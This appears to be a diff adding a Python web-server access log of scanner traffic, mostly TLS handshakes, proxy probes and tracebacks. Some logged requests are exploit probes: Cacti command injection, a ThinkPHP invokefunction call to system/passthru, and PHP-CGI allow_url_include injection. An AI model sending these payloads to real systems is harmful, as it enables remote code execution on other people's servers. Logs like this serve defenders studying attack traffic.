+18.218.118.203 - - [29/Aug/2026 19:42:13] "\x16\x03\x01\x01\x00\x01\x00\x00ü\x03\x03K\x11ç+¹\x09a\x92\x9a}\x14\x04ëaA/Cª£à\x95s[l¾Ú}\x9eì±P\x82 \x15²pz\x04LSu\x11)Ü\x8cÇ\x837~\x01';ÏXÈy\x1d" 400 -
+18.218.118.203 - - [29/Aug/2026 19:43:05] code 400, message Bad request version ('À\\x14À')
+18.218.118.203 - - [29/Aug/2026 19:43:05] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ð\x97\x88Þ\x9a\x02"ÅÎL\x8d\x0c\x86À»NÃ/gáV\x1c~\x9b«³`åÿ÷\x00% eò9Õ\x9fv\x89ds 'ör]yzü°¡B\x8eó\x92^\x84QÔxf j\x16\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+62.171.146.116 - - [29/Aug/2026 19:50:04] code 400, message Bad request version ('À\\x14À')
+62.171.146.116 - - [29/Aug/2026 19:50:04] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03 \x96Sf¶S|'6\x0fZvZ¦\x86V\x18ñg¼u\x86Ã\x83tT¼ñúú»A È\x0d¹¨\x9f\x98)ÒKB\x07\x08ug\x99®\x90\x85D\x9aýÝ\x81·è\x80ØXgâ\x99\x9b\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.195.83 - - [29/Aug/2026 20:01:13] code 400, message Bad request version ('À\\x14À')
+66.132.195.83 - - [29/Aug/2026 20:01:13] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03t7¯ð[]/c¬¬K\x84í\x9fý;¿}\x00z\x02%\x02f'hkÐÑ~ÃÙ H«çÖq·\x86±\x9fC\x8b|Ce\x04Ó\x97A3\x12#1 3ò\x9c2ûQr´Ì\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.195.83 - - [29/Aug/2026 20:01:23] "GET / HTTP/1.1" 200 -
+66.132.195.83 - - [29/Aug/2026 20:01:30] code 505, message Invalid HTTP version (2.0)
+66.132.195.83 - - [29/Aug/2026 20:01:30] "PRI * HTTP/2.0" 505 -
+66.132.195.83 - - [29/Aug/2026 20:01:54] code 400, message Bad request version ('À\\x14À')
+66.132.195.83 - - [29/Aug/2026 20:01:54] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03J\x8e"u6YZD@¢T\x07=¦\x9cAhäV°È¥¼&·\x84Ä\x93ÿ\x89b\x82 -\x11)1äN\x8eØ£Rè\x19ì§¼U\x8dGµ\x18û\x06Ôþ\x99`¶\x1cÏ?{Ø\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+66.132.195.83 - - [29/Aug/2026 20:01:57] code 404, message File not found
+66.132.195.83 - - [29/Aug/2026 20:01:57] "GET /wiki HTTP/1.1" 404 -
+91.92.47.78 - - [29/Aug/2026 20:25:50] code 404, message File not found
+91.92.47.78 - - [29/Aug/2026 20:25:50] "GET /login HTTP/1.1" 404 -
+45.79.181.94 - - [29/Aug/2026 20:29:19] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('69.164.217.74', 52898)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+69.164.217.74 - - [29/Aug/2026 20:41:48] "GET / HTTP/1.1" 200 -
+172.104.11.51 - - [29/Aug/2026 20:42:18] "GET / HTTP/1.1" 200 -
+216.226.77.20 - - [29/Aug/2026 21:38:08] code 400, message Bad request version ('\\x8a\\x8a\\x13\\x01\\x13\\x02\\x13\\x03À+À/À,À0Ì©Ì¨À\\x13À\\x14\\x00\\x9c\\x00\\x9d\\x00/\\x005\\x01\\x00\\x00\\x7f\\x00\\x05\\x00\\x05\\x01\\x00\\x00\\x00\\x00\\x00')
+216.226.77.20 - - [29/Aug/2026 21:38:08] "\x16\x03\x01\x00ì\x01\x00\x00è\x03\x03ÂãÃvó*¯\x89Þ¼¶8JöC\x98êz\x99æ\x06û;t7".\x80Ô¥AÌ Þs\x9bí9Ã&H\x8d5\x99+è·Þ\x18\x08\x1e\x94\x1eO\x82¼¼4¥½j3Ãb\x81\x00 \x8a\x8a\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x00\x7f\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00" 400 -
+216.226.77.20 - - [29/Aug/2026 21:54:21] "GET / HTTP/1.1" 200 -
+216.226.77.20 - - [29/Aug/2026 21:55:18] code 404, message File not found
+216.226.77.20 - - [29/Aug/2026 21:55:18] "GET /favicon.ico HTTP/1.1" 404 -
+5.63.13.124 - - [29/Aug/2026 22:08:27] code 501, message Unsupported method ('CONNECT')
+5.63.13.124 - - [29/Aug/2026 22:08:27] "CONNECT telegram.org:443 HTTP/1.1" 501 -
+5.63.13.124 - - [29/Aug/2026 22:08:31] code 400, message Bad request syntax ('\\x05\\x02\\x00\\x01')
+5.63.13.124 - - [29/Aug/2026 22:08:31] "\x05\x02\x00\x01" 400 -
+5.63.13.124 - - [29/Aug/2026 22:08:33] code 400, message Bad request syntax ('\\x04\\x01\\x01»')
+5.63.13.124 - - [29/Aug/2026 22:08:33] "\x04\x01\x01»" 400 -
+147.185.132.46 - - [29/Aug/2026 22:17:35] "GET / HTTP/1.1" 200 -
+91.92.47.78 - - [29/Aug/2026 22:31:22] code 404, message File not found
+91.92.47.78 - - [29/Aug/2026 22:31:22] "GET /login HTTP/1.1" 404 -
+----------------------------------------
+Exception occurred during processing of request from ('194.195.210.47', 34666)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+194.195.210.47 - - [29/Aug/2026 22:39:47] "GET / HTTP/1.1" 200 -
+172.234.217.192 - - [29/Aug/2026 22:40:19] "GET / HTTP/1.1" 200 -
+185.247.137.228 - - [29/Aug/2026 22:48:27] "GET / HTTP/1.1" 200 -
+192.248.150.180 - - [29/Aug/2026 23:43:36] "GET / HTTP/1.1" 200 -
+172.239.64.84 - - [30/Aug/2026 00:03:24] "GET / HTTP/1.1" 200 -
+94.154.43.70 - - [30/Aug/2026 00:12:02] code 404, message File not found
+94.154.43.70 - - [30/Aug/2026 00:12:02] "GET /login HTTP/1.1" 404 -
+138.197.153.245 - - [30/Aug/2026 00:37:48] code 400, message Bad request version ('À#À¬À®À+À')
+138.197.153.245 - - [30/Aug/2026 00:37:48] "\x16\x03\x03\x01§\x01\x00\x01£\x03\x03¿ÿj`éÖ{>zH\x81\x91²+ÿf0\x1cÏÞ)9CÖÓ#(½}\x99nü \x16 ³\x12\x05ÅXÜ\x0fV\x04\x87/ÐÔ°ÀJßn_ÕÞ¨zûS5l[HB\x00\x8a\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:48] code 400, message Bad request version ('À\\x9c\\x00<\\x00/\\x00')
+138.197.153.245 - - [30/Aug/2026 00:37:48] "\x16\x03\x03\x01§\x01\x00\x01£\x03\x03\x1d8 ]\x89R3>\x12ÏKÈ\x12\x8bk³û/»ûZ\x866\x0fÉ>³[(§)= \x13\x8eFâþ$±\x91qËIïÑn{\x98gòrÃ\x9aÖUP·É°¨ÔÔ-c\x00\x8a\x00\x05\x00\x04\x00\x07\x00À\x00\x84\x00º\x00A\x00\x9dÀ¡À\x9d\x00=\x005\x00\x9cÀ À\x9c\x00<\x00/\x00" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:48] code 400, message Bad request version ('\\x06ËÛÏ¼\\x00FÀ\\x12À\\x07Ì\\x14\\x13\\x01\\x13\\x02Ì©ÀsÀrÀ,À¯À\\xadÀ$À')
+138.197.153.245 - - [30/Aug/2026 00:37:48] "\x16\x03\x03\x01X\x01\x00\x01T\x03\x03\x9aý0'\x09|D\x0c"\x02å¶PSâø®\x91û\x83\x91Dp©ËéU\x19¯_¨a A/»¶$:\x90á\x0e\x03¡ ¹m3\x1e ä\x7f2ªôí\x89S-\x85\x06ËÛÏ¼\x00FÀ\x12À\x07Ì\x14\x13\x01\x13\x02Ì©ÀsÀrÀ,À¯À­À$À" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:49] code 400, message Bad request version ("\\x00DÀ\\x13À'À/À\\x14À(À0À`ÀaÀvÀwÌ¨\\x13\\x05\\x13\\x04\\x13\\x03Ì\\x13À\\x11\\x00")
+138.197.153.245 - - [30/Aug/2026 00:37:49] "\x16\x03\x03\x01J\x01\x00\x01F\x03\x03\x9cJ76\x94\x83\x12ýå%°ÁÉ^×qì)H÷Í5x=¹ì\x87L(+\x16g ]x ÄvìÀ ã\x03!ÓÇþ\x81±Ê\x9c¹räO£®>{\x85\x89Â\x1a\x1e\x1c\x00DÀ\x13À'À/À\x14À(À0À`ÀaÀvÀwÌ¨\x13\x05\x13\x04\x13\x03Ì\x13À\x11\x00" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:49] code 400, message Bad request version ("&\\x909\\x00`\\x97\\x8fÁýsÏx¡:Ú$\\x12#äý\\x00\\x8cJJÀ\\x12À\\x13À\\x07À'Ì\\x14À/\\x13\\x01À\\x14\\x13\\x02À(Ì©À0ÀsÀ`ÀrÀaÀ,ÀvÀ¯ÀwÀ\\xadÌ¨À$\\x13\\x05À")
+138.197.153.245 - - [30/Aug/2026 00:37:49] "\x16\x03\x03\x01\x9b\x01\x00\x01\x97\x03\x03wjê\x07ì3ìäí¹kêøª{å\x87:°\x1e/ ö\x1b=\x07(.ð\x87>n øzå\x99ç<)\x8e:k^\x1e&\x909\x00`\x97\x8fÁýsÏx¡:Ú$\x12#äý\x00\x8cJJÀ\x12À\x13À\x07À'Ì\x14À/\x13\x01À\x14\x13\x02À(Ì©À0ÀsÀ`ÀrÀaÀ,ÀvÀ¯ÀwÀ­Ì¨À$\x13\x05À" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:49] code 400, message Bad request version ('À#À¬À®À+À')
+138.197.153.245 - - [30/Aug/2026 00:37:49] "\x16\x03\x02\x01\x9c\x01\x00\x01\x98\x03\x02½\x96¼Æ×i1\x95K~È\x99K\x91D\x88\x82V²\x93ùñ\x87ÿàÍ\x99Ã¦±\x14\x0d ê\x05\x08h\x9f¦äÜ\x11ü%\x8c\x9a\x81\x0f\x1a,ë\x9b]\x86\x0d~iFäÐÚUÑG\\\x00\x8a\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:49] code 400, message Bad request version ('À#À¬À®À+À')
+138.197.153.245 - - [30/Aug/2026 00:37:49] "\x16\x03\x01\x01©\x01\x00\x01¥\x03\x03É¶¢É\x9ePT>óëE\x9fUØêÄ\x96ðñC\x14ðÎÒºåð²óìÖ\x93 \x0f\x83¡aNè°Ôè\x94ü&÷°\x8c+Ëã\x89Fÿp\x91]\x1c¬M\x90(ínü\x00\x8a\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:50] code 400, message Bad request version ('À\\x9c\\x00<\\x00/\\x00')
+138.197.153.245 - - [30/Aug/2026 00:37:50] "\x16\x03\x01\x01©\x01\x00\x01¥\x03\x03 J®*Ðr$ÿ\x15¦¨G$\x18ÌgÙx0@Ps¬\x02ÇE\x9c¬õ\x99!« 3\x0c6\x99\x87[ø\x16÷¯zÕñð\x1f qó\x81¶\x02é8º\x9eâv\x1cË\x93ÔM\x00\x8a\x00\x05\x00\x04\x00\x07\x00À\x00\x84\x00º\x00A\x00\x9dÀ¡À\x9d\x00=\x005\x00\x9cÀ À\x9c\x00<\x00/\x00" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:50] code 400, message Bad request version ('À#À¬À®À+À')
+138.197.153.245 - - [30/Aug/2026 00:37:50] "\x16\x03\x01\x01\x9f\x01\x00\x01\x9b\x03\x03Ù«²¼\x05zËsårÉÚJ¶Ì­Á+}\x91¢vd\x88\x8eÜÈØùë\x8e½ tü9É«iq\x8b¼½¥#5í\x81ô÷âô\x8b^¤»|ð¸Â"PÚ\x03«\x00\x80\x00\x16\x003\x00gÀ\x9eÀ¢\x00\x9e\x009\x00kÀ\x9fÀ£\x00\x9f\x00E\x00¾\x00\x88\x00Ä\x00\x9aÀ\x08À\x09À#À¬À®À+À" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:50] code 400, message Bad request version ("\\x07\\x80ô¼ÒvFtVpå<\\x00\\x8cêêÀ\\x12À\\x13À\\x07À'Ì\\x14À/\\x13\\x01À\\x14\\x13\\x02À(Ì©À0ÀsÀ`ÀrÀaÀ,ÀvÀ¯ÀwÀ\\xadÌ¨À$\\x13\\x05À")
+138.197.153.245 - - [30/Aug/2026 00:37:50] "\x16\x03\x01\x01¶\x01\x00\x01²\x03\x03\x8a\x88æ 6\x80x¼à\\Ö\x9b 5z\x96J\x82\x8b¡\x17]\x1fû2CSIÀë\x1c\x04 Ð^ºë\x9czÄ\x13î\x1d·wºÑ©\x1a\x7f|¯\x09\x07\x80ô¼ÒvFtVpå<\x00\x8cêêÀ\x12À\x13À\x07À'Ì\x14À/\x13\x01À\x14\x13\x02À(Ì©À0ÀsÀ`ÀrÀaÀ,ÀvÀ¯ÀwÀ­Ì¨À$\x13\x05À" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:50] code 400, message Bad request version ('À\\x13À')
+138.197.153.245 - - [30/Aug/2026 00:37:50] "\x16\x03\x01\x05Ú\x01\x00\x05Ö\x03\x03î`½xQ)x\x89Øw\x191lP§\x1a\x07ír\x95\x7frº\x88§_\x97«:lE® ¥ËÉ\x84i¸:ÏCîÜ,Fì_\x88ßµ¦/ô8,ÿÄáe_¾\x9b\x8fg\x002À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+138.197.153.245 - - [30/Aug/2026 00:37:51] code 400, message Bad request version ('\\x00\\x02\\x01\\x00ÿ\\x01\\x00\\x01\\x00\\x00\\x17\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x05\\x00\\x05\\x01\\x00\\x00\\x00\\x00\\x00')
+138.197.153.245 - - [30/Aug/2026 00:37:51] "\x16\x03\x01\x05®\x01\x00\x05ª\x03\x03|Q4ÄL\x88\x03]\x14\x85ý6\x7fÑö!ë¡Ôú\x0d\x90¾7ÃÚ,\x05»\x94\x00Y a\x95d\x151ÓüÆ×èÉª¬ãrtO¢\x91*\x12Ü²_\x08=¤\x80ó¨_Î\x00\x06\x13\x01\x13\x02\x13\x03\x01\x00\x05[\x00\x0b\x00\x02\x01\x00ÿ\x01\x00\x01\x00\x00\x17\x00\x00\x00\x12\x00\x00\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00" 400 -
+94.154.43.140 - - [30/Aug/2026 00:42:56] code 404, message File not found
+94.154.43.140 - - [30/Aug/2026 00:42:56] "GET /login HTTP/1.1" 404 -
+204.76.203.49 - - [30/Aug/2026 00:59:01] code 501, message Unsupported method ('CONNECT')
+204.76.203.49 - - [30/Aug/2026 00:59:01] "CONNECT api.i.pn:443 HTTP/1.1" 501 -
+204.76.203.49 - - [30/Aug/2026 00:59:06] code 400, message Bad request syntax ('\\x05\\x01\\x00')
+204.76.203.49 - - [30/Aug/2026 00:59:06] "\x05\x01\x00" 400 -
+45.198.224.27 - - [30/Aug/2026 01:04:33] code 404, message File not found
+45.198.224.27 - - [30/Aug/2026 01:04:33] "GET /login HTTP/1.1" 404 -
+----------------------------------------
+Exception occurred during processing of request from ('167.94.146.50', 35196)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+167.94.146.50 - - [30/Aug/2026 01:59:56] "GET / HTTP/1.1" 200 -
+167.94.146.50 - - [30/Aug/2026 01:59:59] code 400, message Bad request version ('À\\x14À')
+167.94.146.50 - - [30/Aug/2026 01:59:59] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x17+:°\x90ÆÀPU\x84\x10, F¯é±÷\x0b\x1e\x10Yýü\x17dúí\x99\\·_ \x82]p\x9c\x91çNSf"Ò\x13à¼þ0\x8a:§Ý\x04qÉ\x99º@!°±¨UZ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+167.94.146.50 - - [30/Aug/2026 02:00:02] "GET / HTTP/1.1" 200 -
+167.94.146.50 - - [30/Aug/2026 02:00:02] code 505, message Invalid HTTP version (2.0)
+167.94.146.50 - - [30/Aug/2026 02:00:02] "PRI * HTTP/2.0" 505 -
+167.94.146.50 - - [30/Aug/2026 02:00:03] code 404, message File not found
+167.94.146.50 - - [30/Aug/2026 02:00:03] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.146.50 - - [30/Aug/2026 02:00:07] code 400, message Bad request version ('\\x03øA©A\\x8f@öi"')
+167.94.146.50 - - [30/Aug/2026 02:00:07] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03oíÖ:³w\x0c\x94õzß-\x86âsmC¤,@Ä\x18Âh\x07Bà~¶e\x810 NÅçhB\x97 eZë­\x9eU\x82®à\x0c\x1c\x03øA©A\x8f@öi"" 400 -
+167.94.146.50 - - [30/Aug/2026 02:00:07] code 404, message File not found
+167.94.146.50 - - [30/Aug/2026 02:00:07] "GET /robots.txt HTTP/1.1" 404 -
+195.182.16.23 - - [30/Aug/2026 02:21:21] code 404, message File not found
+195.182.16.23 - - [30/Aug/2026 02:21:21] "GET /SDK/webLanguage HTTP/1.1" 404 -
+187.57.131.55 - - [30/Aug/2026 02:38:08] code 404, message File not found
+187.57.131.55 - - [30/Aug/2026 02:38:08] "GET http://a7x.overflow.biz/hachk.php HTTP/1.1" 404 -
+74.48.45.46 - - [30/Aug/2026 02:50:42] code 404, message File not found
+74.48.45.46 - - [30/Aug/2026 02:50:42] "GET /cacti/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;echo%20CACTI_d7fe54c891 HTTP/1.1" 404 -
+74.48.45.46 - - [30/Aug/2026 02:50:42] code 404, message File not found
+74.48.45.46 - - [30/Aug/2026 02:50:42] "GET /remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;echo%20CACTI_d7fe54c891 HTTP/1.1" 404 -
+74.48.45.46 - - [30/Aug/2026 02:50:44] "GET / HTTP/1.1" 200 -
+74.48.45.46 - - [30/Aug/2026 02:50:45] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:45] "POST / HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:46] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:46] "POST /index.action HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:46] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:46] "POST /struts2-showcase/index.action HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:48] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:48] "POST /geoserver/wfs HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:48] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:48] "POST /geoserver/ows HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:48] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:48] "POST /wfs HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:50] code 404, message File not found
+74.48.45.46 - - [30/Aug/2026 02:50:50] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20TP20062_d4f0e771f9 HTTP/1.1" 404 -
+74.48.45.46 - - [30/Aug/2026 02:50:50] "GET /?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][]=echo%20TP20062_d4f0e771f9 HTTP/1.1" 200 -
+74.48.45.46 - - [30/Aug/2026 02:50:50] code 404, message File not found
+74.48.45.46 - - [30/Aug/2026 02:50:50] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20TP20062_d4f0e771f9 HTTP/1.1" 404 -
+74.48.45.46 - - [30/Aug/2026 02:50:52] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:52] "POST /php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:52] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:52] "POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:53] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:53] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:54] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:54] "POST /template/aui/text-inline.vm HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:55] code 501, message Unsupported method ('POST')
+74.48.45.46 - - [30/Aug/2026 02:50:55] "POST /wiki/template/aui/text-inline.vm HTTP/1.1" 501 -
+74.48.45.46 - - [30/Aug/2026 02:50:55] "GET / HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:11:59] code 404, message File not found
+119.56.76.255 - - [30/Aug/2026 03:11:59] "GET /favicon.ico HTTP/1.1" 404 -
+119.56.76.255 - - [30/Aug/2026 03:12:02] "GET /refs/ HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:02] "GET /refs/chazihu-lid.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:02] "GET /refs/chazihu.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:02] "GET /refs/cha_revolve.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:02] "GET /refs/cha_sym.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:02] "GET /refs/cha_plan.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:02] "GET /refs/shipiao_two.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:03] "GET /refs/ziye_cmp.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:03] "GET /refs/ziye_qc.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:03] "GET /refs/jubian_sheet.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:03] "GET /refs/liufang.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:03] "GET /refs/liufang_cmp.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:04] "GET /refs/liufang_qc.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:04] "GET /refs/refs_measured.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:04] "GET /refs/dq11.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:04] "GET /refs/refs_all.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:04] "GET /refs/dq_compare6.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:04] "GET /refs/part_compare.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:04] "GET /refs/td_sweep.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:05] "GET /refs/qc_detail.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:06] "GET /refs/spout_zoom.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:06] "GET /refs/lip.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:06] "GET /refs/lid_sweep.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:07] "GET /refs/bead.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:07] "GET /refs/fillet.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:08] "GET /refs/knob.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:08] "GET /refs/qc_duoqiu2.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:08] "GET /refs/neck_after.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:08] "GET /refs/xs_regress.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:08] "GET /refs/jingzhou.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:09] "GET /refs/gp_regress.png HTTP/1.1" 200 -
+119.56.76.255 - - [30/Aug/2026 03:12:09] "GET /refs/pair.mp4 HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('119.56.76.255', 33516)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+94.154.43.70 - - [30/Aug/2026 03:31:29] code 404, message File not found
+94.154.43.70 - - [30/Aug/2026 03:31:29] "GET /login HTTP/1.1" 404 -
+52.180.141.93 - - [30/Aug/2026 03:40:35] "GET / HTTP/1.1" 200 -
+52.180.141.93 - - [30/Aug/2026 03:40:36] code 400, message Bad request syntax ('MGLNDD_178.104.53.233_8080')
+52.180.141.93 - - [30/Aug/2026 03:40:36] "MGLNDD_178.104.53.233_8080" 400 -
+103.26.83.46 - - [30/Aug/2026 03:52:15] code 501, message Unsupported method ('POST')
+103.26.83.46 - - [30/Aug/2026 03:52:15] "POST /GponForm/diag_Form?images/ HTTP/1.1" 501 -
